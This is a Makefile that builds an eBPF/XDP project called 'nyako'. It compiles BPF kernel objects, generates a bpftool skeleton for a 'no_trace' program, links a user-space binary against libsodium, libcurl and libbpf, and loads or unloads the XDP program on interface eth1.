TARGET=-target bpf
CC=clang -g -O2 -Wall
LIBS=-lsodium -lcurl -lbpf -pthread
BPFTOOL=bpftool

nyako_kern:
	$(CC) $(TARGET) -c src/nyako_kern.c -o nyako_kern.o

no_trace_kern:
	$(CC) $(TARGET) -c src/no_trace_kern.c -o no_trace_kern.o
	$(BPFTOOL) gen skeleton no_trace_kern.o > src/no_trace_skeleton.h

nyako:
	$(CC) -o nyako.o src/utils.c src/logger.c src/crypto.c src/message.c src/network.c src/bpf_helpers.c src/no_trace.c src/nyako.c $(LIBS)

load:
	xdp-loader load -vv -m skb -s nyako_kern eth1 nyako_kern.o

unload:
	xdp-loader unload -a eth1

clean:
	rm nyako.o